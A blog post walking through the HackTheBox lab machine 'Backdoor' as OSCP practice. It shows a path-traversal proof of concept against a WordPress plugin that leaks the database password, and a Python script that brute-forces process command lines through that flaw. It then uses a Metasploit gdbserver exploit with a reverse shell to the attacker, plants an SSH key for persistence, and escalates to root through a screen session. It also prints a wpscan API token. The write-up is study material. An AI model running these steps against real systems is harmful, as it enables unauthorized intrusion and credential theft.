---
layout: post
title: "backdoor"
date: 2025-09-01 
categories: OSCP Playlist
---
# backdoor

## Summary:

- Discover plugins in wordpress from wp-content/plugins
- ebook-download LFI vuln
- discover pw in wp-config.php
- nmap rescan full port discover port 1337
- bruteforce pid with custom python script /proc/$PID/cmdline to find out command relating to 1337
- gdbserver exploit, x64 payload using msfconsole
- read processes, discover cron jobs on screen
- attach on screen running as root

First let’s enumerate open ports and services:

```bash
sudo nmap -sC -sV 10.10.11.125 -oN nmap/backdoor

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap has identified that the application on port 80 is Wordpress version 5.8.1. Let’s keep that in mind and visit the web page:

![image.png]({{ site.baseurl }}/assets/backdoor/image.png)

Clicking on home, we get prompted that burp does not recognise backdoor.htb. Let’s add that to /etc/hosts:

```bash
10.10.11.125 backdoor.htb
```

In the blog page, there is a leave comment function:

![image.png]({{ site.baseurl }}/assets/backdoor/image%201.png)

Let’s investigate this further by leaving a  comment and seeing the request on burp.

After posting our comment, it looks like it will need admin approval:

![image.png]({{ site.baseurl }}/assets/backdoor/image%202.png)

Request:

```bash
POST /wp-comments-post.php HTTP/1.1
Host: backdoor.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://backdoor.htb
Connection: keep-alive
Referer: http://backdoor.htb/index.php/2021/07/24/hello-world/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

comment=some+comment&author=bobby&email=bobby%40gmail.com&url=someweb.com&submit=Post+Comment&comment_post_ID=1&comment_parent=0
```

Let’s also fuzz for subdirectories.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://backdoor.htb/FUZZ -ic
```

Visiting wp-admin works, as it redirects us to a login page. Let’s attempt default login:

```bash
admin:admin
```

Did not work.

Let’s also use wpscan for vulnerable plugins and themes:

```bash
sudo wpscan --url http://backdoor.htb --enumerate --api-token 2xkAZXNy4fEMFKyADzmPF2VTMDYb9qV3aUtDrDK5Zzs

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://backdoor.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

sudo wpscan --url http://backdoor.htb --enumerate --api-token 2xkAZXNy4fEMFKyADzmPF2VTMDYb9qV3aUtDrDK5Zzs -e ap
```

We know there is a user admin on wordpress. Let’s also check whether there are any plugins manually (wpscan did not identify any).

```bash
http://backdoor.htb/wp-content/plugins
```

![image.png]({{ site.baseurl }}/assets/backdoor/image%203.png)

We have a ebook-download. Let’s see if there are any exploits by searching ebook-download exploits:

https://www.exploit-db.com/exploits/39575

The poc:

```bash
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

Let’s put that URL in:

```bash
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

We get to download the file:

```bash
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

We get the database password. Let’s see if the same password is reused here and attempt to log on to wp-admin:

```bash
admin:MQYBJSaD#DxG6qbm
```

Did not work.

We know our LFI does not have RCE capabilities as we got the source code of wp-config.php instead of it executing. Let’s do a full port scan now, and output the result as nmap finds them:

```bash
sudo nmap -p- 10.10.11.125 -v --min-rate=10000
#new port found
Discovered open port 1337/tcp on 10.10.11.125
<SNIP>
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
1337/tcp  open     waste
11844/tcp filtered unknown
25580/tcp filtered unknown
30512/tcp filtered unknown
```

We can also do the same with rustscan:

```bash
rustscan -a 10.10.11.125

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63
```

![image.png]({{ site.baseurl }}/assets/backdoor/image%204.png)

Attempting to interact with the service with nc did not work.

We know that there should be some command on the backend that started the service on port 1337, therefore there should be a command line execution string containing that. 

/proc/$PID/cmdline shows exactly what command was used to execute a process, therefore, we can use a script that bruteforces PID, to find the one containing port 1337. 

```bash
import requests
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import logging

# Configure logging
logging.basicConfig(filename='pid_bruteforce.log', level=logging.INFO, 
                    format='%(asctime)s - PID %(pid)d: %(message)s')

# Configuration
BASE_URL = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"
PID_RANGE = range(1, 1000)  # Adjust as needed
TIMEOUT = 5  # Seconds
MAX_WORKERS = 20  # Number of concurrent threads

def fetch_pid_cmdline(pid):
    """Fetch and parse the cmdline for a given PID."""
    url = f"{BASE_URL}{pid}/cmdline"
    try:
        response = requests.get(url, timeout=TIMEOUT)
        if response.status_code == 200:
            # Clean the response: remove JavaScript and null bytes
            cmdline = (response.text.replace(f'/proc/{pid}/cmdline', '')
                             .replace('<script>window.close()</script>', '')
                             .replace('\x00', ' ').strip())
            if cmdline and len(cmdline) > 1:  # Only return non-empty results
                return pid, cmdline
    except (requests.RequestException, ValueError) as e:
        logging.error(f"Error fetching PID {pid}: {str(e)}")
    return pid, None

def main():
    print("Starting PID brute-forcing...")
    results = []
    
    # Use ThreadPoolExecutor for parallel requests
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Map PIDs to fetch_pid_cmdline function with progress bar
        future_to_pid = {executor.submit(fetch_pid_cmdline, pid): pid for pid in PID_RANGE}
        for future in tqdm(future_to_pid, total=len(PID_RANGE), desc="Scanning PIDs"):
            pid, cmdline = future.result()
            if cmdline:
                output = f"PID {pid}: {cmdline}"
                print(output)
                logging.info(f"{cmdline}", extra={'pid': pid})
                results.append((pid, cmdline))
    
    # Summary
    print(f"\nFound {len(results)} active PIDs with command lines.")
    if results:
        print("Results saved to pid_bruteforce.log")

if __name__ == "__main__":
    main()
```

Now let’s execute it:

```bash
python3 pid_bruteforce.py | grep 1337

PID 852: /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done

```

A gdbserver is on 1337. Let’s search up gdbserver exploit. We find one with RCE https://www.exploit-db.com/exploits/50539

It also seems to be on msfconsole. Let’s do that:

```bash
msfconsole
search gdbserver
```

Find version of backend:

```bash
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../proc/cpuinfo

cat cpuinfo | grep lm

flags           : <SNIP> cp lm constant_tsc rep_good
```

The presence of the lm string tells us that the target is going to be x64. We can also just execute the exploit and it should automatically tell us if there is an architecture mismatch if we were using x86.

```bash
search gdbserver

Matching Modules
================

   #  Name                               Disclosure Date  Rank   Check  Description
   -  ----                               ---------------  ----   -----  -----------
   0  exploit/multi/gdb/gdb_server_exec  2014-08-24       great  No     GDB Server Remote Payload Execution
   1    \_ target: x86                   .                .      .      .
   2    \_ target: x86_64                .                .      .      .
   3    \_ target: ARMLE                 .                .      .      .
   4    \_ target: AARCH64               .                .      .      .
```

```bash
use 0
set RHOSTS 10.10.11.125
set RPORT 1337
set LHOST tun0
set LPORT 4444
set payload payload/linux/x64/shell_reverse_tcp #can get this from show payloads
run

```

We now have shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Let’s keep persistence:

```bash
#Let's create a ssh key on attack host
ssh-keygen -f backdoor
cat backdoor.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfz0gjY5Visi9noe5ym+qJPJ20G0r7F5LvgYoox1EWt kali@kali

#Now cat the content and echo it to authorized_keys on target host
mkdir .ssh
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfz0gjY5Visi9noe5ym+qJPJ20G0r7F5LvgYoox1EWt kali@kali" >> authorized_keys

#Now we try to login:
chmod 600 backdoor #change to secure permission to allow use of private key

ssh -i backdoor user@10.10.11.125
```

Let’s start enumerating. 

```bash
sudo -l #requires password, tried db password MQYBJSaD#DxG6qbm, did not work
id #nothing
ls -la #nothing
ss -lntp

State         Recv-Q        Send-Q                Local Address:Port                  Peer Address:Port        Process                                     
LISTEN        0             4096                  127.0.0.53%lo:53                         0.0.0.0:*                                                       
LISTEN        0             128                         0.0.0.0:22                         0.0.0.0:*                                                       
LISTEN        0             1                           0.0.0.0:1337                       0.0.0.0:*            users:(("gdbserver",pid=8409,fd=3))        
LISTEN        0             70                        127.0.0.1:33060                      0.0.0.0:*                                                       
LISTEN        0             151                       127.0.0.1:3306                       0.0.0.0:*                                                       
LISTEN        0             511                               *:80                               *:*                                                       
LISTEN        0             128                            [::]:22                            [::]:* 
```

Let’s try to connect mysql and see if the db password works there:

```bash
mysql -u wordpressuser -h localhost -p #MQYBJSaD#DxG6qbm
```

We are in.

```bash
show databases

use wordpress

show tables;

select * from wp_users;

 ID | user_login | user_pass                          | user_nicename | user_email          | user_url            | user_registered     | user_activation_key | user_status | display_name |
  1 | admin      | $P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5. | admin         | admin@wordpress.com | http://backdoor.htb | 2021-07-24 13:19:11 |                     |           0 | admin
```

Let’s attempt to decrypt this. Save the password hash to a file and use hashcat:

```bash
.\hashcat.exe wordlists\admin_hash.txt wordlists\rockyou.txt
```

Did not work.

Let’s look at running processes:

```bash
ps -ef --forest

#intersting finds:

root         966       1  0 17:46 ?        00:00:00 SCREEN -dmS root

root         801       1  0 17:46 ?        00:00:00 /usr/sbin/cron -f
root         812     801  0 17:46 ?        00:00:00  \_ /usr/sbin/CRON -f
root         852     812  0 17:46 ?        00:00:00  |   \_ /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; d
root        8396     852  0 18:35 ?        00:00:00  |       \_ su user -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
user        8399    8396  0 18:35 ?        00:00:00  |           \_ bash -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
user        8409    8399  0 18:35 ?        00:00:00  |               \_ gdbserver --once 0.0.0.0:1337 /bin/true
user        8413    8409  0 18:35 ?        00:00:00  |                   \_ /bin/true
root         813     801  0 17:46 ?        00:00:00  \_ /usr/sbin/CRON -f
root         861     813  0 17:46 ?        00:00:01      \_ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;;
root       11918     861  0 18:57 ?        00:00:00          \_ sleep 1
```

From this process, it looks like that screen is ran as user root in detached mode (-dmS) and it is executed by a cron job. Let’s list our cron jobs:

```bash
crontab -l
```

Nothing. Let’s just try to interact with screen:

```bash
screen -ls root/  #the trailing / is important

There is a suitable screen on:
        966.root        (09/01/2025 05:46:57 PM)        (Multi, detached)
1 Socket in /run/screen/S-root.

```

now to resume that session:

```bash
screen -r root/
```

We now have root.

Another way of getting the screen is through exporting the TERM environmental variable, then attaching to the session:

```bash
export TERM=xterm

screen -x root/root
```